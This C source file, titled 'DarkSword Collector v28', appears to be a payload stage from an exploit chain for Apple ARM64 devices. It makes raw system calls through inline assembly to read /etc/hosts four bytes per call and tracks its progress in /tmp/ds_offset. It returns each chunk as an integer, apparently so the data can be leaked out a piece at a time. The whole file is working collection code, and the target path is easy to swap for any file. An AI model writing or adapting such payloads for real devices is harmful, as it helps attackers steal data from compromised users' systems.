/**
 * DarkSword Collector v28 - Self-managing via /tmp files
 * Reads /tmp/ds_offset to get current offset (default 0)
 * Reads 4 bytes from /etc/hosts at that offset
 * Writes offset+4 back to /tmp/ds_offset
 * Returns the 4 bytes read (or sentinel when done)
 */

static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory");
    return x0;
}
static long _svc2(long n, long a, long b) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory");
    return x0;
}
static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory");
    return x0;
}
static long _svc4(long n, long a, long b, long c, long d) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    register long x3 __asm__("x3") = d;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2), "r"(x3) : "memory");
    return x0;
}

#define SYS_open   5
#define SYS_read   3
#define SYS_close  6
#define SYS_write  4
#define SYS_lseek  199
#define SEEK_SET   0
#define O_RDONLY   0
#define O_WRONLY   0x0001
#define O_CREAT    0x0200
#define O_TRUNC    0x0400

/* Simple int<->ASCII helpers */
static int _atoi4(const char *s) {
    int v = 0;
    while (*s >= '0' && *s <= '9') v = v * 10 + (*s++ - '0');
    return v;
}
static int _itoa4(int v, char *buf) {
    char tmp[12];
    int i = 0;
    if (v == 0) { buf[0] = '0'; buf[1] = 0; return 1; }
    while (v > 0) { tmp[i++] = '0' + (v % 10); v /= 10; }
    int len = i;
    for (int j = 0; j < len; j++) buf[j] = tmp[len - 1 - j];
    buf[len] = 0;
    return len;
}

int ds_start(void) {
    char obuf[12] = {0};
    int offset = 0;

    /* Read current offset from /tmp/ds_offset */
    int fd = (int)_svc2(SYS_open, (long)"/tmp/ds_offset", O_RDONLY);
    if (fd >= 0) {
        int n = (int)_svc3(SYS_read, fd, (long)obuf, 10);
        _svc1(SYS_close, fd);
        if (n > 0) offset = _atoi4(obuf);
    }

    /* Read 4 bytes from /etc/hosts at offset */
    fd = (int)_svc2(SYS_open, (long)"/etc/hosts", O_RDONLY);
    if (fd < 0) return 0xDEAD0000;
    if (offset > 0) _svc4(SYS_lseek, fd, (long)offset, SEEK_SET, 0);
    unsigned char buf[4] = {0};
    int n = (int)_svc3(SYS_read, fd, (long)buf, 4);
    _svc1(SYS_close, fd);

    if (n < 1) return 0xBEEF0000; /* done */

    /* Write new offset */
    char nbuf[12] = {0};
    int len = _itoa4(offset + 4, nbuf);
    fd = (int)_svc4(SYS_open, (long)"/tmp/ds_offset", O_WRONLY | O_CREAT | O_TRUNC, 0644, 0);
    if (fd >= 0) {
        _svc3(SYS_write, fd, (long)nbuf, len);
        _svc1(SYS_close, fd);
    }

    return (int)buf[0] | ((int)buf[1] << 8) | ((int)buf[2] << 16) | ((int)buf[3] << 24);
}
